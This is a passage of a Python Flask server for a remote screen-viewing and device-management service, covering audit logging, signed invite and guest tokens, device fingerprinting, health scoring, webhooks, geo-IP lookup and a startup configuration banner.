                os.replace(_AUDIT_LOG_FILE, bak)
            except Exception:
                pass
    except Exception:
        pass

_orig_audit = _audit
def _audit(event: str, **kw):
    entry = {"ts": utcnow(), "event": event, **kw}
    with _audit_lock:
        _audit_log.append(entry)
    _bg(_persist_audit, entry)

# ── Signed invite tokens ──────────────────────────────────────────────────────
_INVITE_HMAC_SECRET = os.environ.get("INVITE_HMAC_SECRET", JWT_SECRET).encode()

def _sign_invite_token(token: str) -> str:
    """Return HMAC-SHA256 hex of the token — embeds into invite URL."""
    return hmac.new(_INVITE_HMAC_SECRET, token.encode(), hashlib.sha256).hexdigest()[:16]

def _verify_invite_token(token: str, sig: str) -> bool:
    expected = _sign_invite_token(token)
    return hmac.compare_digest(expected, sig.lower())

# ── Per-org rate limiting ─────────────────────────────────────────────────────
_org_rate_buckets: dict = collections.defaultdict(collections.deque)
_org_rate_lock          = threading.Lock()
_ORG_RATE_LIMIT_RPM     = int(os.environ.get("ORG_RATE_LIMIT_RPM", "1000"))

def _org_rate_check(org_id: str) -> bool:
    if not org_id or _ORG_RATE_LIMIT_RPM <= 0:
        return True
    now = time.time()
    with _org_rate_lock:
        dq = _org_rate_buckets[org_id]
        while dq and now - dq[0] > 60:
            dq.popleft()
        if len(dq) >= _ORG_RATE_LIMIT_RPM:
            return False
        dq.append(now)
    return True

# ── Device fingerprint registry ───────────────────────────────────────────────
_device_fingerprints: dict = {}   # device_id → {hostname, os, mac_hash, first_seen, last_seen}
_fp_lock = threading.Lock()

def _register_fingerprint(did: str, data: dict):
    """Track device fingerprint. Alert on suspicious changes."""
    import hashlib as _h
    mac_hash = _h.md5(str(data.get("local_ip", "") + data.get("hostname", "")).encode()).hexdigest()[:12]
    with _fp_lock:
        existing = _device_fingerprints.get(did)
        now = utcnow()
        if existing is None:
            _device_fingerprints[did] = {
                "hostname":   data.get("hostname", ""),
                "os":         data.get("os", ""),
                "mac_hash":   mac_hash,
                "first_seen": now,
                "last_seen":  now,
                "connect_count": 1,
            }
        else:
            changed = []
            if existing["hostname"] != data.get("hostname", ""):
                changed.append("hostname")
            if existing["os"] != data.get("os", ""):
                changed.append("os")
            if existing["mac_hash"] != mac_hash:
                changed.append("network")
            existing["last_seen"]     = now
            existing["connect_count"] = existing.get("connect_count", 0) + 1
            if changed:
                log.warning(f"Fingerprint change for {did}: {changed}")
                _audit("fingerprint_change", device_id=did, changed=changed)
                if sio:
                    sio.emit("security_alert", {
                        "type": "fingerprint_change",
                        "device_id": did,
                        "changed": changed,
                        "ts": now,
                    }, room="dashboards")

# ── Device health scoring ─────────────────────────────────────────────────────
_device_health: dict = {}  # device_id → {score: 0-100, issues: [], ts}
_health_lock = threading.Lock()

def _compute_health_score(did: str) -> dict:
    """Compute a 0-100 health score based on frame rate, HB frequency, errors."""
    score  = 100
    issues = []
    with _dev_lock:
        dev = _devices.get(did, {})
    # Heartbeat recency
    lb = dev.get("last_beat")
    if lb:
        try:
            age = (datetime.datetime.utcnow() - datetime.datetime.fromisoformat(lb.replace("Z",""))).total_seconds()
            if age > 30:
                score -= 20
                issues.append(f"heartbeat_stale_{int(age)}s")
        except Exception:
            pass
    # CPU/RAM alerts
    cpu = dev.get("cpu") or 0
    ram = dev.get("ram") or 0
    if cpu > 90:
        score -= 15
        issues.append(f"cpu_critical_{cpu:.0f}pct")
    elif cpu > 75:
        score -= 5
        issues.append(f"cpu_high_{cpu:.0f}pct")
    if ram > 90:
        score -= 10
        issues.append(f"ram_critical_{ram:.0f}pct")
    # Frame stats — low frame count with active viewers
    fps_ring = _device_fps_ring.get(did)
    if fps_ring and len(fps_ring) >= 2:
        span = fps_ring[-1] - fps_ring[0]
        fps  = (len(fps_ring) - 1) / span if span > 0 else 0
        if fps < 5:
            score -= 10
            issues.append(f"fps_low_{fps:.1f}")
    score = max(0, score)
    result = {"score": score, "issues": issues, "ts": utcnow(), "device_id": did}
    with _health_lock:
        _device_health[did] = result
    return result

# ── Reconnect storm throttle ──────────────────────────────────────────────────
_reconnect_times: dict = collections.defaultdict(collections.deque)  # did → deque(timestamps)
_storm_lock = threading.Lock()
_STORM_WINDOW_S  = int(os.environ.get("STORM_WINDOW_S",  "60"))
_STORM_MAX_CONN  = int(os.environ.get("STORM_MAX_CONN",  "10"))

def _is_reconnect_storm(did: str) -> bool:
    now = time.time()
    with _storm_lock:
        dq = _reconnect_times[did]
        while dq and now - dq[0] > _STORM_WINDOW_S:
            dq.popleft()
        dq.append(now)
        if len(dq) > _STORM_MAX_CONN:
            log.warning(f"Reconnect storm detected: {did} ({len(dq)} in {_STORM_WINDOW_S}s)")
            _audit("reconnect_storm", device_id=did, count=len(dq))
            return True
    return False

# ── Org-level webhook routing ─────────────────────────────────────────────────
_org_webhooks: dict = {}   # org_id → webhook_url

def _fire_org_webhook(org_id: str, event: str, payload: dict):
    """Send webhook to org-specific URL if configured."""
    url = _org_webhooks.get(org_id) or WEBHOOK_URL
    if not url or not REQUESTS_OK:
        return
    def _do():
        try:
            body = json.dumps({"event": event, "org_id": org_id, "ts": utcnow(), **payload})
            headers = {"Content-Type": "application/json", "User-Agent": "MViewServer/14.0"}
            if WEBHOOK_SECRET:
                sig = hmac.new(WEBHOOK_SECRET.encode(), body.encode(), hashlib.sha256).hexdigest()
                headers["X-MView-Signature"] = f"sha256={sig}"
            _requests.post(url, data=body, timeout=8, headers=headers)
        except Exception:
            pass
    _bg(_do)

# ── Geo-IP enrichment (best-effort, no external dependency) ──────────────────
_geo_cache: dict = {}  # ip → {country, city}

def _geoip_lookup(ip: str) -> dict:
    """Best-effort geo lookup using ip-api.com (free tier, no API key)."""
    if not ip or ip in ("127.0.0.1", "::1", ""):
        return {}
    if ip in _geo_cache:
        return _geo_cache[ip]
    if not REQUESTS_OK:
        return {}
    try:
        r = _requests.get(f"http://ip-api.com/json/{ip}?fields=country,city,isp,org",
                          timeout=3)
        if r.status_code == 200:
            data = r.json()
            result = {"country": data.get("country"), "city": data.get("city"),
                      "isp": data.get("isp")}
            _geo_cache[ip] = result
            return result
    except Exception:
        pass
    return {}

# ── Live config push ──────────────────────────────────────────────────────────
@app.route("/api/admin/config-push", methods=["POST"])
@require_admin
def api_config_push():
    """Push config values to all connected viewers/dashboards via SSE."""
    data = request.get_json(silent=True) or {}
    _sse_broadcast("config_update", {"config": data, "ts": utcnow()})
    return jsonify({"status": "pushed", "keys": list(data.keys())})

# ── Device health endpoint ────────────────────────────────────────────────────
@app.route("/api/device/<device_id>/health")
@require_admin
def api_device_health(device_id):
    score = _compute_health_score(device_id)
    return jsonify(score)

@app.route("/api/devices/health")
@require_admin
def api_all_health():
    with _dev_lock:
        online = list(_devices.keys())
    results = [_compute_health_score(did) for did in online]
    return jsonify({"health": results, "count": len(results), "ts": utcnow()})

# ── Device fingerprint endpoint ───────────────────────────────────────────────
@app.route("/api/device/<device_id>/fingerprint")
@require_admin
def api_device_fingerprint(device_id):
    with _fp_lock:
        fp = _device_fingerprints.get(device_id, {})
    return jsonify({"device_id": device_id, "fingerprint": fp})

# ── Org webhook routing ───────────────────────────────────────────────────────
@app.route("/api/orgs/<org_id>/webhook", methods=["POST"])
@require_admin
def api_org_webhook(org_id):
    data = request.get_json(silent=True) or {}
    url  = data.get("url", "")
    _org_webhooks[org_id] = url
    _audit("org_webhook_set", org_id=org_id, url=url[:80])
    return jsonify({"status": "set", "org_id": org_id, "url": url})

# ── Signed invite verification endpoint ──────────────────────────────────────
@app.route("/api/invite/verify", methods=["POST"])
def api_invite_verify():
    data  = request.get_json(silent=True) or {}
    token = data.get("token", "")
    sig   = data.get("sig", "")
    if not token or not sig:
        return jsonify({"valid": False, "error": "missing_fields"}), 400
    valid = _verify_invite_token(token, sig)
    return jsonify({"valid": valid, "token": token})

# ── Reconnect storm status ────────────────────────────────────────────────────
@app.route("/api/admin/storm-status")
@require_admin
def api_storm_status():
    now = time.time()
    with _storm_lock:
        active = {did: len([t for t in dq if now - t < _STORM_WINDOW_S])
                  for did, dq in _reconnect_times.items()}
    flagged = {did: cnt for did, cnt in active.items() if cnt > _STORM_MAX_CONN // 2}
    return jsonify({"flagged": flagged, "window_s": _STORM_WINDOW_S,
                    "threshold": _STORM_MAX_CONN, "ts": utcnow()})

# ── Aggregate Prometheus per-org metrics ──────────────────────────────────────
@app.route("/metrics/org/<org_id>")
@require_admin
def api_metrics_org(org_id):
    with _org_lock:
        grps = [g for g in _groups.values() if g.get("org_id") == org_id]
        devs_in_org = set()
        for g in grps:
            devs_in_org.update(g.get("device_ids", set()))
    devs_in_org.update(did for did, oid in _device_org.items() if oid == org_id)
    with _dev_lock:
        online_in_org = [did for did in devs_in_org if did in _devices]
    fc = sum(_devices.get(did, {}).get("frame_count", 0) for did in online_in_org)
    lines = [
        f"# Org: {org_id}",
        f"mview_org_devices_online{{org=\"{org_id}\"}} {len(online_in_org)}",
        f"mview_org_frames_total{{org=\"{org_id}\"}} {fc}",
        f"mview_org_groups{{org=\"{org_id}\"}} {len(grps)}",
    ]
    resp = make_response("\n".join(lines) + "\n")
    resp.headers["Content-Type"] = "text/plain"
    return resp

# ── Bulk device health refresh ────────────────────────────────────────────────
@app.route("/api/admin/health-refresh", methods=["POST"])
@require_admin
def api_health_refresh():
    with _dev_lock:
        online = list(_devices.keys())
    def _refresh():
        for did in online:
            _compute_health_score(did)
    _bg(_refresh)
    return jsonify({"status": "refreshing", "count": len(online)})

# ── Audit log file export ─────────────────────────────────────────────────────
@app.route("/api/audit-log/export")
@require_admin
def api_audit_export():
    try:
        if os.path.exists(_AUDIT_LOG_FILE):
            content = open(_AUDIT_LOG_FILE, encoding="utf-8").read()
        else:
            content = ""
        resp = make_response(content)
        resp.headers["Content-Type"] = "text/plain"
        resp.headers["Content-Disposition"] = "attachment; filename=audit.jsonl"
        return resp
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ── Guest viewer token (scoped, time-limited, single device) ──────────────────
_guest_tokens: dict = {}   # token → {device_id, expires_at, created_by}
_guest_lock = threading.Lock()

@app.route("/api/guest-token", methods=["POST"])
@require_admin
def api_guest_token():
    data = request.get_json(silent=True) or {}
    did  = data.get("device_id", "")
    ttl  = int(data.get("ttl_seconds", 3600))
    if not did:
        return jsonify({"error": "device_id required"}), 400
    token = "GUEST-" + secrets.token_hex(12)
    exp   = (datetime.datetime.utcnow() + datetime.timedelta(seconds=ttl)).isoformat()
    with _guest_lock:
        _guest_tokens[token] = {"device_id": did, "expires_at": exp,
                                 "created_at": utcnow(), "uses": 0}
    _audit("guest_token_created", token=token[:16]+"...", device_id=did, ttl=ttl)
    jwt_token = _jwt_encode({"role": "viewer", "sub": f"guest:{did}",
                              "device_id": did, "guest": True}, ttl)
    return jsonify({"token": token, "jwt": jwt_token, "device_id": did,
                    "expires_at": exp}), 201

@app.route("/api/guest-token/<token>/redeem", methods=["POST"])
def api_guest_redeem(token):
    with _guest_lock:
        gt = _guest_tokens.get(token)
    if not gt:
        return jsonify({"error": "Invalid guest token"}), 404
    try:
        exp = datetime.datetime.fromisoformat(gt["expires_at"])
        if datetime.datetime.utcnow() > exp:
            return jsonify({"error": "Token expired"}), 410
    except Exception:
        pass
    with _guest_lock:
        if token in _guest_tokens:
            _guest_tokens[token]["uses"] = gt.get("uses", 0) + 1
    did = gt["device_id"]
    jwt_token = _jwt_encode({"role": "viewer", "sub": f"guest:{did}",
                              "device_id": did, "guest": True}, 1800)
    return jsonify({"jwt": jwt_token, "device_id": did, "expires_in": 1800})

# ── Multi-device snapshot (batch health+status) ───────────────────────────────
@app.route("/api/devices/snapshot")
@require_admin
def api_devices_snapshot():
    """Returns health + live stats for all devices in one call."""
    with _dev_lock:
        devs = dict(_devices)
    rows  = _get_cached_db_rows()
    db_map = {r.get("device_id"): r for r in rows}
    result = []
    for did, dev in devs.items():
        db = db_map.get(did, {})
        fps_ring = _device_fps_ring.get(did)
        fps = 0
        if fps_ring and len(fps_ring) >= 2:
            span = fps_ring[-1] - fps_ring[0]
            fps  = round((len(fps_ring) - 1) / span, 1) if span > 0 else 0
        health = _device_health.get(did, {})
        result.append({
            "device_id":    did,
            "label":        dev.get("label"),
            "hostname":     dev.get("hostname"),
            "os":           dev.get("os"),
            "local_ip":     dev.get("local_ip"),
            "cpu":          dev.get("cpu"),
            "ram":          dev.get("ram"),
            "frame_count":  dev.get("frame_count", 0),
            "fps":          fps,
            "health_score": health.get("score"),
            "health_issues":health.get("issues", []),
            "org_id":       _device_org.get(did),
            "group_id":     _device_group.get(did),
            "tags":         dict(_device_tags.get(did, {})),
            "connected_at": dev.get("connected_at"),
            "last_beat":    dev.get("last_beat"),
            "agent_version":dev.get("agent_version"),
            "rtt_ms":       dev.get("rtt_ms"),
        })
    return jsonify({"snapshot": result, "count": len(result), "ts": utcnow()})

# ── Integrations: Slack/Teams webhook notification ────────────────────────────
_notification_webhooks: dict = {}   # channel_name → {type: slack|teams, url}

@app.route("/api/integrations/notify", methods=["POST"])
@require_admin
def api_integrations_notify():
    data = request.get_json(silent=True) or {}
    channel = data.get("channel", "default")
    if channel not in _notification_webhooks:
        return jsonify({"error": "Channel not configured"}), 404
    hook = _notification_webhooks[channel]
    message = data.get("message", "")
    def _send():
        try:
            if hook["type"] == "slack":
                payload = {"text": message}
            else:
                payload = {"text": message}
            _requests.post(hook["url"], json=payload, timeout=8)
        except Exception as e:
            log.warning(f"Notification send failed: {e}")
    _bg(_send)
    return jsonify({"status": "sent", "channel": channel})

@app.route("/api/integrations/channels", methods=["POST"])
@require_admin
def api_integrations_channels():
    data = request.get_json(silent=True) or {}
    name = data.get("name", "")
    if not name:
        return jsonify({"error": "name required"}), 400
    _notification_webhooks[name] = {
        "type": data.get("type", "slack"),
        "url":  data.get("url", ""),
    }
    return jsonify({"status": "configured", "channel": name}), 201

@app.route("/api/integrations/channels")
@require_admin
def api_integrations_list():
    return jsonify({"channels": list(_notification_webhooks.keys())})

# ── Device alias (human-friendly names) ──────────────────────────────────────
_device_aliases: dict = {}   # device_id → alias

@app.route("/api/device/<device_id>/alias", methods=["GET", "POST", "DELETE"])
@require_admin
def api_device_alias(device_id):
    if request.method == "GET":
        return jsonify({"device_id": device_id, "alias": _device_aliases.get(device_id)})
    elif request.method == "DELETE":
        _device_aliases.pop(device_id, None)
        return jsonify({"status": "removed"})
    data = request.get_json(silent=True) or {}
    alias = data.get("alias", "").strip()
    if alias:
        _device_aliases[device_id] = alias
        _audit("alias_set", device_id=device_id, alias=alias)
    return jsonify({"device_id": device_id, "alias": alias})

# ── Session pinning (force viewer to specific agent version) ──────────────────
_version_requirements: dict = {}   # org_id → min_version

@app.route("/api/orgs/<org_id>/version-requirement", methods=["POST"])
@require_admin
def api_org_version_req(org_id):
    data = request.get_json(silent=True) or {}
    ver  = data.get("min_version", "")
    _version_requirements[org_id] = ver
    _audit("version_requirement_set", org_id=org_id, min_version=ver)
    return jsonify({"org_id": org_id, "min_version": ver})

# ── Patch manifest endpoint (for agent auto-update) ───────────────────────────
@app.route("/api/patch-manifest")
def api_patch_manifest():
    """Returns the current agent binary hash and download URL for version checks."""
    raw = _fetch_agent_bytes()
    sha = hashlib.sha256(raw).hexdigest() if raw else ""
    return jsonify({
        "version":      VERSION,
        "sha256":       sha,
        "download_url": AGENT_STORAGE_URL,
        "size_bytes":   len(raw) if raw else 0,
        "ts":           utcnow(),
    })

# ── Geo-IP enrichment endpoint ────────────────────────────────────────────────
@app.route("/api/device/<device_id>/geo")
@require_admin
def api_device_geo(device_id):
    with _dev_lock:
        dev = _devices.get(device_id, {})
    ip = dev.get("local_ip", "")
    geo = _geoip_lookup(ip) if ip else {}
    return jsonify({"device_id": device_id, "ip": ip, "geo": geo})

# ── Bulk device tag update ────────────────────────────────────────────────────
@app.route("/api/devices/bulk-tag", methods=["POST"])
@require_admin
def api_bulk_tag():
    data       = request.get_json(silent=True) or {}
    device_ids = data.get("device_ids", [])
    tags       = data.get("tags", {})
    if not device_ids or not tags:
        return jsonify({"error": "device_ids and tags required"}), 400
    for did in device_ids:
        _device_tags[did].update(tags)
    _audit("bulk_tag", count=len(device_ids), tags=list(tags.keys()))
    return jsonify({"updated": len(device_ids), "tags": list(tags.keys())})

# ── Connection quality report ─────────────────────────────────────────────────
@app.route("/api/device/<device_id>/quality")
def api_device_quality(device_id):
    fps_ring = _device_fps_ring.get(device_id)
    fps = 0
    if fps_ring and len(fps_ring) >= 2:
        span = fps_ring[-1] - fps_ring[0]
        fps  = round((len(fps_ring) - 1) / span, 1) if span > 0 else 0
    now_t   = time.time()
    dq      = _frame_stats.get(device_id)
    recent  = [b for t, b in (dq or []) if now_t - t < 5.0]
    kbps    = sum(recent) / (5.0 * 1024) if recent else 0
    with _dev_lock:
        dev = _devices.get(device_id, {})
    return jsonify({
        "device_id":    device_id,
        "fps":          fps,
        "kbps":         round(kbps, 1),
        "rtt_ms":       dev.get("rtt_ms"),
        "health_score": _device_health.get(device_id, {}).get("score"),
        "ts":           utcnow(),
    })

# ── Fingerprint storm detector hook — wire into _handle_agent_connect ─────────
_original_agent_connect_bg = _agent_connect_bg
def _agent_connect_bg(did, label, data):
    _register_fingerprint(did, data)
    if _is_reconnect_storm(did):
        log.warning(f"Blocking reconnect storm from {did}")
    else:
        _original_agent_connect_bg(did, label, data)

def startup():
    log.info("=" * 72)
    log.info(f"  Screen Connect Server  v{VERSION}  - ULTRA LIVE-SYNC ENTERPRISE")
    log.info("=" * 72)
    log.info(f"  Gevent patched:        {_GEVENT_OK}   - MUST be True for stream stability")
    log.info(f"  Async mode:            gevent")
    log.info(f"  Port:                  {PORT}")
    log.info(f"  Heartbeat TTL:         {HEARTBEAT_TIMEOUT}s")
    log.info(f"  Agent exclusive:       {AGENT_EXCLUSIVE}")
    log.info(f"  Max viewers/device:    {MAX_VIEWERS_PER_DEVICE or 'unlimited'}")
    log.info(f"  Viewer idle kick:      {VIEWER_IDLE_TIMEOUT or 'disabled'}s")
    log.info(f"  Max session dur:       {MAX_SESSION_DURATION or 'unlimited'}s")
    log.info(f"  Rate limit:            {_RATE_LIMIT_RPM} req/min per IP")
    log.info(f"  Max frame size:        {MAX_FRAME_BYTES // (1024*1024)}MB")
    log.info(f"  Max frame kbps:        {MAX_FRAME_KBPS or 'unlimited'}")
    log.info(f"  Frame dedup (fast):    {FRAME_DEDUP}")
    log.info(f"  GOP buffer size:       {GOP_BUF_SIZE} frames (0=live-only)")
    log.info(f"  Stale-frame guard:     150ms TTL")
    log.info(f"  Cursor delta suppress: 2px threshold")
    log.info(f"  Real-time FPS API:     /api/fps  /api/latency")
    log.info(f"  JWT enabled:           {JWT_OK}")
    log.info(f"  TOTP enabled:          {TOTP_OK}")
    log.info(f"  Redis scale-out:       {bool(REDIS_URL and REDIS_OK)}")
    log.info(f"  Org isolation:         {ORG_ISOLATION}")
    log.info(f"  Brute-force lockout:   {BRUTE_LOCKOUT_MAX} fails - {BRUTE_LOCKOUT_TTL}s")
    log.info(f"  Signed webhooks:       {bool(WEBHOOK_SECRET)}")
    log.info(f"  Webhook:               {'-> ' + WEBHOOK_URL[:50] if WEBHOOK_URL else 'disabled'}")
    log.info(f"  SSE stream:            /api/events")
    log.info(f"  Prometheus metrics:    /metrics (text/plain)")
    log.info(f"  Health checks:         /health/live  /health/ready  /health/full")
    log.info(f"  ── v14 Enterprise Additions ──────────────────────────────────")
    log.info(f"  Signed invite tokens:  /api/invite/verify")
    log.info(f"  Device health scores:  /api/devices/health  /api/device/<id>/health")
    log.info(f"  Device fingerprints:   /api/device/<id>/fingerprint")
    log.info(f"  Device snapshot:       /api/devices/snapshot (batch health+stats)")
    log.info(f"  Guest tokens:          /api/guest-token (scoped time-limited access)")
    log.info(f"  Org webhooks:          /api/orgs/<id>/webhook")
    log.info(f"  Org rate limiting:     {_ORG_RATE_LIMIT_RPM} req/min per org")
    log.info(f"  Reconnect storm guard: {_STORM_MAX_CONN} max in {_STORM_WINDOW_S}s")
    log.info(f"  Geo-IP enrichment:     /api/device/<id>/geo")
    log.info(f"  Device aliases:        /api/device/<id>/alias")
    log.info(f"  Connection quality:    /api/device/<id>/quality")
    log.info(f"  Integrations (Slack):  /api/integrations/channels")
    log.info(f"  Audit log export:      /api/audit-log/export")
    log.info(f"  Audit log file:        {_AUDIT_LOG_FILE}")
    log.info(f"  Per-org Prometheus:    /metrics/org/<org_id>")
    log.info(f"  Live config push:      /api/admin/config-push (SSE fanout)")
    log.info(f"  Patch manifest:        /api/patch-manifest")
    log.info(f"  Bulk tag:              /api/devices/bulk-tag")
    log.info(f"  Version requirements:  /api/orgs/<id>/version-requirement")
    log.info(f"  Bulk commands:         /api/devices/bulk-command")
    log.info(f"  Bulk invites:          /api/invites/bulk (max {BULK_INVITE_MAX})")
    log.info(f"  CSV export:            /api/sessions/export.csv")
    log.info(f"  Script library:        /api/scripts")
    log.info(f"  Macro library:         /api/macros")
    log.info(f"  Scheduled jobs:        /api/schedule")
    log.info(f"  Session recordings:    /api/recordings")
    log.info(f"  Orgs/Groups:           /api/orgs  /api/groups")
    log.info(f"  Plugin hooks:          on_agent_connect / on_frame / on_command")
    log.info(f"  Agent caps:            {list(AGENT_CAPS.keys())}")
    log.info("=" * 72)
    log.info("  RENDER start command (REQUIRED):")
    log.info("    gunicorn -k geventwebsocket.gunicorn.workers.GeventWebSocketWorker \\")
    log.info("             -w 1 --timeout 300 --keep-alive 75 --bind 0.0.0.0:$PORT server:app")
    log.info("=" * 72)
    if not _GEVENT_OK:
        log.critical("GEVENT NOT INSTALLED — server will crash under load!")
        log.critical("Fix: pip install gevent gevent-websocket")

# ══════════════════════════════════════════════════════════════════════════════
#  Entry point
# ══════════════════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    startup()
    if SOCKETIO_OK and sio:
        sio.run(app, host="0.0.0.0", port=PORT, debug=False, allow_unsafe_werkzeug=True)
    else:
        app.run(host="0.0.0.0", port=PORT, debug=False)
